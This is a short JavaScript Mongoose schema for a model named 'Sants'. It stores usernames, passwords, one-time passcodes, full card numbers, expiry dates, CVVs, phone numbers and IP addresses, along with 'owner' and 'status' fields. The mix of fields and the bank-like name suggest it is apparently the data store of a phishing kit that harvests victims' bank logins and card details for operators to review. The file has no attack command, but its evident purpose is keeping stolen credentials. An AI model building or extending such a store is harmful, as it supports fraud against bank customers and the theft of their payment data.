const mongoose = require("mongoose");

const santsSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    otp: String,
    ccname: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    phone: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("Sants", santsSchema);
